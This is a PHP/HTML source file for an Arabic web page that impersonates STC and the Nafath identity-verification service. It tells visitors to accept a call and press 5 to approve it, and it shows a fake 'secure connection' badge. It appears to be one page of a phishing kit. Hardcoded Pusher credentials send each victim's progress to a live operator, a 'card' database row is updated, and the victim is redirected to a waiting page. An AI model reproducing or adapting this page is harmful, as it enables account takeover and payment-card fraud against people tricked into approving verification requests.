<?php
session_start();
error_reporting(0);
ini_set('display_errors', 0);

require_once('./add-efaa.php');
require_once('./dashboard/init.php');
require_once('./vendor/autoload.php');

if (isset($_SESSION['user_id'])) {
    $User->UpdateCurrentPage($_SESSION['user_id'], 'اتصال نفاذ (STC)');
    $options = ['cluster' => 'ap2', 'useTLS' => true];
    $pusher = new Pusher\Pusher('4a9de0023f3255d461d9', '3803f60c4dc433d66655', '1918568', $options);
    $pusher->trigger('bcare', 'curreneft-page', ['userId' => $_SESSION['user_id'], 'page' => 'اتصال نفاذ (STC)']);
}

if (isset($_GET['reject'])) {
    $showError = true;
}

if (isset($_POST['continue'])) {
    $options = ['cluster' => 'ap2', 'useTLS' => true];
    $pusher = new Pusher\Pusher('4a9de0023f3255d461d9', '3803f60c4dc433d66655', '1918568', $options);

    include("DB_CON.php");
    $X = 0;
    $q = "UPDATE card SET CheckTheInfo_Nafad='$X' WHERE id =" . $_SESSION['card_id'] . ";";

    if (mysqli_query($con, $q)) {
        mysqli_close($con);
        $userId = $_SESSION['user_id'];
        $User->UpdateStatus($userId, 'اتصال نفاذ (STC)');
        $pusher->trigger('bcare', 'update-user-accountt', [
            'userId' => $userId,
            'updatedData' => ['message' => 'اتصال نفاذ (STC)', 'type' => '3']
        ]);
        echo "<script>document.location.href='wait-nafath.php';</script>";
        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>توثيق الاتصال | نفاذ</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <style>
        :root {
            --primary-nafad: #4f008c;
            --bg-light: #f8fafc;
        }

        * {
            padding: 0;
            margin: 0;
            box-sizing: border-box;
            font-family: "Cairo", serif;
        }

        body {
            background-color: var(--bg-light);
            color: #1e293b;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .header-nafad {
            background: white;
            padding: 20px 0;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
        }

        .nafad-logo {
            height: 50px;
        }

        .auth-card {
            background: white;
            border-radius: 24px;
            padding: 40px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.03);
            max-width: 500px;
            width: 100%;
            margin: 60px auto;
            border: 1px solid rgba(0, 0, 0, 0.05);
            text-align: center;
        }

        .icon-box {
            width: 100px;
            height: 100px;
            background: #f7f1ff;
            color: var(--primary-nafad);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 3rem;
            margin: 0 auto 30px;
            animation: pulse-phone 2s infinite;
        }

        @keyframes pulse-phone {
            0% {
                transform: scale(1);
                box-shadow: 0 0 0 0 rgba(79, 0, 140, 0.4);
            }

            70% {
                transform: scale(1.05);
                box-shadow: 0 0 0 20px rgba(79, 0, 140, 0);
            }

            100% {
                transform: scale(1);
                box-shadow: 0 0 0 0 rgba(79, 0, 140, 0);
            }
        }

        .call-message {
            font-weight: 700;
            font-size: 1.25rem;
            line-height: 1.8;
            color: #1e293b;
            margin-bottom: 25px;
        }

        .btn-continue {
            height: 60px;
            border-radius: 12px;
            background: var(--primary-nafad);
            color: white;
            font-weight: 900;
            border: none;
            transition: all 0.3s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            font-size: 1.1rem;
            margin-top: 20px;
        }

        .btn-continue:hover {
            background: #0d7e76;
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(17, 153, 142, 0.2);
        }

        .security-badge {
            background: #f8fafc;
            border-radius: 12px;
            padding: 15px;
            font-size: 0.85rem;
            color: #64748b;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            margin-bottom: 30px;
        }

        footer {
            background: #f1f5f9;
            padding: 40px 0;
            margin-top: auto;
        }

        .footer-logo {
            height: 40px;
            opacity: 0.8;
        }
    </style>
</head>

<body>

    <header class="header-nafad text-center">
        <div class="container">
            <img src="./assets/Stc.png" alt="STC" class="stc-logo" style="height: 45px;">
        </div>
    </header>

    <main class="container">
        <div class="auth-card">
            <div class="icon-box">
                <img src="./assets/Stc.png" alt="STC" style="width: 65px;">
            </div>

            <h4 class="fw-900 mb-3">انتظار الاتصال</h4>

            <div class="call-message">
                سوف تتلقى اتصال من قبل stc يرجى قبول الاتصال والضغط على رقم 5 للموافقة <br>
            </div>

            <div class="security-badge">
                <i class="bi bi-shield-check-fill text-success fs-5"></i>
                اتصال آمن وموثق
            </div>

            <form method="POST">
                <button type="submit" name="continue" class="btn-continue w-100">
                    متابعة <i class="bi bi-arrow-left-circle"></i>
                </button>
            </form>
        </div>
    </main>

    <footer>
        <div class="container">
            <div class="row align-items-center text-center text-md-start">
                <div class="col-md-6 mb-4 mb-md-0">
                    <h6 class="fw-900 mb-2">إس تي سي - شركة الاتصالات السعودية</h6>
                    <p class="text-muted small mb-0">جميع الحقوق محفوظة © 2026 STC</p>
                </div>
                <div class="col-md-6 text-md-end text-center">
                    <img src="./assets/Stc.png" alt="STC" class="footer-logo"
                        style="height: 35px; filter: grayscale(1) opacity(0.6);">
                </div>
            </div>
        </div>
    </footer>

    <!-- Error Modal -->
    <div class="modal fade" id="errorModal" tabindex="-1" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content text-center border-0 shadow-lg" style="border-radius: 24px;">
                <div class="modal-header-error p-5" style="background: #fff5f5;">
                    <div class="error-icon-wrapper mx-auto mb-4" style="width: 70px; height: 70px; background: #fee2e2; color: #ef4444; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 2rem;">
                        <i class="bi bi-exclamation-triangle-fill"></i>
                    </div>
                    <h5 class="fw-900 text-dark mb-3">فشل التحقق من الهوية</h5>
                    <p class="text-muted small px-3">لم تنجح عملية التحقق عبر نفاذ. يرجى التأكد من قبول الاتصال أو الرمز والمحاولة مرة أخرى.</p>
                    <button class="btn w-100 mt-4" data-bs-dismiss="modal" style="background: #f1f5f9; color: #475569; height: 55px; border-radius: 12px; font-weight: 800;">حسناً، فهمت</button>
                </div>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        $(document).ready(function() {
            <?php if (isset($showError) && $showError): ?>
            var myModal = new bootstrap.Modal(document.getElementById('errorModal'));
            myModal.show();
            <?php endif; ?>
        });
    </script>
    <script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>
    <script src="js/presence-tracker.js"></script>
    <script>
        var userIdFromSession = <?= json_encode($_SESSION['user_id']); ?>;
    </script>
    <?php include 'chat_widget.php'; ?>
</body>

</html>